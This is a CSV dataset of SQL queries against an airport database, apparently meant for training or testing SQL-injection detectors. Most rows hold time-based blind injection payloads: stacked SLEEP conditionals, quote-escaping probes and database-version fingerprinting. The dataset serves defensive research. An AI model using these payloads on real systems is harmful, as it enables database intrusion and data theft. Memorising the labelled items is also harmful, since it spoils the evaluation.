full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((88=52),SLEEP(5),4417)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((52=52),SLEEP(5),1588)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((88 52),SLEEP(5),5559)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((15=15),SLEEP(5),3972)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((15=19),SLEEP(5),1145)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((15=87),SLEEP(5),8743)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((87=19),SLEEP(5),7483)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((19=19),SLEEP(5),2623)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((87 19),SLEEP(5),9149)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((22=22),SLEEP(5),2361)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((22=47),SLEEP(5),5909)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((22=98),SLEEP(5),1257)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((98=47),SLEEP(5),2781)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((47=47),SLEEP(5),1971)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((98 47),SLEEP(5),8810)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((44=44),SLEEP(5),6889)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((44=69),SLEEP(5),8861)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((44=87),SLEEP(5),1677)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((87=69),SLEEP(5),3258)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((69=69),SLEEP(5),8107)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((87 69),SLEEP(5),8069)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((93=93),SLEEP(5),1160)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((93=94),SLEEP(5),5567)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((93=95),SLEEP(5),3948)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((95=94),SLEEP(5),4007)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((94=94),SLEEP(5),4820)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((95 94),SLEEP(5),2637)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((8201=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8201),SLEEP(5),5899)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((9217>9216),SLEEP(5),5394)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),4008)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),8667)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),2785)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),7958)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),5401)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),7081)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),6123)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),3997)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((4966=4966/* NoValue */),SLEEP(1),4966)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((3691=3691/*!80300 AND 5875=1314*/),SLEEP(1),3691)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((2689=2689/*!80302 AND 5793=8138*/),SLEEP(1),2689)#""",1,airport-S7,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte,,,""(')(,)"") OR name LIKE ""Laporte,,,""(')(,)""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte'pMZSLa<'"">VIetJZ"") OR name LIKE ""Laporte'pMZSLa<'"">VIetJZ""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"") OR name LIKE ""Laporte""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte');SELECT SLEEP(5)#"") OR name LIKE ""Laporte');SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte';SELECT SLEEP(5)#"") OR name LIKE ""Laporte';SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"";SELECT SLEEP(5)#"") OR name LIKE ""Laporte"";SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte'));SELECT SLEEP(5)#"") OR name LIKE ""Laporte'));SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte')));SELECT SLEEP(5)#"") OR name LIKE ""Laporte')));SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte%';SELECT SLEEP(5)#"") OR name LIKE ""Laporte%';SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT SLEEP(5)#"") OR name LIKE ""Laporte"");SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT SLEEP(0)#"") OR name LIKE ""Laporte"");SELECT SLEEP(0)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT SLEEP(5)#"") OR name LIKE ""Laporte"");SELECT SLEEP(5)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((29=29),SLEEP(5),9672)#"") OR name LIKE ""Laporte"");SELECT IF((29=29),SLEEP(5),9672)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((29=50),SLEEP(5),3362)#"") OR name LIKE ""Laporte"");SELECT IF((29=50),SLEEP(5),3362)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((29=76),SLEEP(5),4843)#"") OR name LIKE ""Laporte"");SELECT IF((29=76),SLEEP(5),4843)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((76=50),SLEEP(5),6075)#"") OR name LIKE ""Laporte"");SELECT IF((76=50),SLEEP(5),6075)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((50=50),SLEEP(5),1702)#"") OR name LIKE ""Laporte"");SELECT IF((50=50),SLEEP(5),1702)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((76 50),SLEEP(5),8692)#"") OR name LIKE ""Laporte"");SELECT IF((76 50),SLEEP(5),8692)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((15=15),SLEEP(5),6184)#"") OR name LIKE ""Laporte"");SELECT IF((15=15),SLEEP(5),6184)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((15=38),SLEEP(5),9318)#"") OR name LIKE ""Laporte"");SELECT IF((15=38),SLEEP(5),9318)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((15=82),SLEEP(5),8505)#"") OR name LIKE ""Laporte"");SELECT IF((15=82),SLEEP(5),8505)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((82=38),SLEEP(5),9011)#"") OR name LIKE ""Laporte"");SELECT IF((82=38),SLEEP(5),9011)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((38=38),SLEEP(5),5269)#"") OR name LIKE ""Laporte"");SELECT IF((38=38),SLEEP(5),5269)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((82 38),SLEEP(5),5344)#"") OR name LIKE ""Laporte"");SELECT IF((82 38),SLEEP(5),5344)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((26=26),SLEEP(5),8868)#"") OR name LIKE ""Laporte"");SELECT IF((26=26),SLEEP(5),8868)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((26=64),SLEEP(5),6302)#"") OR name LIKE ""Laporte"");SELECT IF((26=64),SLEEP(5),6302)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((26=92),SLEEP(5),4275)#"") OR name LIKE ""Laporte"");SELECT IF((26=92),SLEEP(5),4275)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((92=64),SLEEP(5),3023)#"") OR name LIKE ""Laporte"");SELECT IF((92=64),SLEEP(5),3023)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((64=64),SLEEP(5),3595)#"") OR name LIKE ""Laporte"");SELECT IF((64=64),SLEEP(5),3595)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((92 64),SLEEP(5),9752)#"") OR name LIKE ""Laporte"");SELECT IF((92 64),SLEEP(5),9752)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((20=20),SLEEP(5),8339)#"") OR name LIKE ""Laporte"");SELECT IF((20=20),SLEEP(5),8339)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((20=58),SLEEP(5),2211)#"") OR name LIKE ""Laporte"");SELECT IF((20=58),SLEEP(5),2211)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((20=68),SLEEP(5),8233)#"") OR name LIKE ""Laporte"");SELECT IF((20=68),SLEEP(5),8233)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((68=58),SLEEP(5),8216)#"") OR name LIKE ""Laporte"");SELECT IF((68=58),SLEEP(5),8216)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((58=58),SLEEP(5),4092)#"") OR name LIKE ""Laporte"");SELECT IF((58=58),SLEEP(5),4092)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((68 58),SLEEP(5),2268)#"") OR name LIKE ""Laporte"");SELECT IF((68 58),SLEEP(5),2268)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((49=49),SLEEP(5),8967)#"") OR name LIKE ""Laporte"");SELECT IF((49=49),SLEEP(5),8967)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((49=65),SLEEP(5),3979)#"") OR name LIKE ""Laporte"");SELECT IF((49=65),SLEEP(5),3979)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((49=68),SLEEP(5),6277)#"") OR name LIKE ""Laporte"");SELECT IF((49=68),SLEEP(5),6277)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((68=65),SLEEP(5),1576)#"") OR name LIKE ""Laporte"");SELECT IF((68=65),SLEEP(5),1576)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((65=65),SLEEP(5),9219)#"") OR name LIKE ""Laporte"");SELECT IF((65=65),SLEEP(5),9219)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((68 65),SLEEP(5),6054)#"") OR name LIKE ""Laporte"");SELECT IF((68 65),SLEEP(5),6054)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((2146=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2146),SLEEP(5),7136)#"") OR name LIKE ""Laporte"");SELECT IF((2146=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2146),SLEEP(5),7136)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((3526>3525),SLEEP(5),3160)#"") OR name LIKE ""Laporte"");SELECT IF((3526>3525),SLEEP(5),3160)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),5976)#"") OR name LIKE ""Laporte"");SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),5976)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),9558)#"") OR name LIKE ""Laporte"");SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),9558)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),4407)#"") OR name LIKE ""Laporte"");SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),4407)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),8307)#"") OR name LIKE ""Laporte"");SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),8307)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),4394)#"") OR name LIKE ""Laporte"");SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),4394)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),4878)#"") OR name LIKE ""Laporte"");SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),4878)#""",1,airport-S10,Unknown,Unknown
